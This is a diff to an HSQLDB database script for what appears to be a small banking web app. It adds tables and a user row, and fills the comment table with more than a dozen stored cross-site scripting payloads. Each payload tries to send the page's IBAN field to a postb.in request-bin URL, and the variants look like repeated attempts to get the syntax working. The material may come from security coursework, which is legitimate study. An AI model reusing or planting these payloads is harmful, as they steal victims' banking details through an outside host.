@@ -28,11 +28,16 @@ SET FILES NIO TRUE
 SET FILES NIO SIZE 256
 SET FILES LOG TRUE
 SET FILES LOG SIZE 50
-SET FILES CHECK 1
-SET DATABASE COLLATION SQL_TEXT PAD SPACE
+SET FILES CHECK 316
+SET DATABASE COLLATION "SQL_TEXT" PAD SPACE
 CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
 ALTER USER SA SET LOCAL TRUE
 CREATE SCHEMA PUBLIC AUTHORIZATION DBA
+CREATE MEMORY TABLE PUBLIC.COMMENT(COMMENT VARCHAR(255),DATE VARCHAR(10),SCORE VARCHAR(1))
+CREATE MEMORY TABLE PUBLIC.INVESTMENT(OWNER VARCHAR(50),DATE INTEGER,AMOUNT VARCHAR(50),CURRENCY VARCHAR(10),AMOUNTSFR VARCHAR(50))
+CREATE MEMORY TABLE PUBLIC.PAYMENT(OWNER VARCHAR(50),TARGET VARCHAR(50),AMOUNT INTEGER,CURRENCY VARCHAR(10),AMOUNTSFR INTEGER)
+CREATE MEMORY TABLE PUBLIC.MESSAGE(OWNER VARCHAR(50),DATE INTEGER,VIEWTYPE INTEGER,MESSAGE VARCHAR(255))
+CREATE MEMORY TABLE PUBLIC.USER(EMAIL VARCHAR(50),PASSWORD VARCHAR(100))
 ALTER SEQUENCE SYSTEM_LOBS.LOB_ID RESTART WITH 1
 SET DATABASE DEFAULT INITIAL SCHEMA PUBLIC
 GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.SQL_IDENTIFIER TO PUBLIC
@@ -41,3 +46,20 @@ GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.TIME_STAMP TO PUBLIC
 GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CARDINAL_NUMBER TO PUBLIC
 GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CHARACTER_DATA TO PUBLIC
 GRANT DBA TO SA
+SET SCHEMA SYSTEM_LOBS
+INSERT INTO BLOCKS VALUES(0,2147483647,0)
+SET SCHEMA PUBLIC
+INSERT INTO COMMENT VALUES('<script>new Image().src=encodeURI("https://postb.in/1601119971063-6338393660262?iban=".concat(document.getElementById(''iban'').text));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''https://postb.in/1601119971063-6338393660262?iban=''.concat(document.getElementById(''iban'').text));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src=encodeURI(''https://postb.in/1601119971063-6338393660262?iban=''.concat(document.getElementById(''iban'').text));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src=encodeURI(''https://postb.in/1601119971063-6338393660262?iban=''.concat(document.getElementById(''iban'').text));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src=encodeURI(''https://postb.in/1601119971063-6338393660262?iban=''.concat(document.getElementById(''iban'').text));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''https://postb.in/1601121815843-1528982487507?iban=''.concat(document.getElementById(''iban'');</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('new Image().src = encodeURI(''https://postb.in/1601121815843-1528982487507?iban=''.concat(document.getElementById(''iban''));','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''https://postb.in/1601121815843-1528982487507?iban=''.concat(document.getElementById(''iban''));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''https://postb.in/1601121815843-1528982487507?iban=''.concat(document.getElementById(''iban'')));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''https://postb.in/1601121815843-1528982487507?iban=''.concat(document.getElementById(''iban'').text));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''http://postb.in/1601121815843-1528982487507?iban=''.concat(document.getElementById(''iban'').text));</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''http://postb.in/1601121815843-1528982487507?iban='' document.getElementById(''iban'').text);</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>\u000anew Image().src = encodeURI("https://postb.in/1601121815843-1528982487507?iban=".concat(document.getElementById(''iban'').text));\u000a</script>','26-09-2020','5')
+INSERT INTO USER VALUES('greg@gmail.com','bb6679bd15b7f000a63a68cc289e8be1b7dd36710be46dffac38962a7e9a54b0')
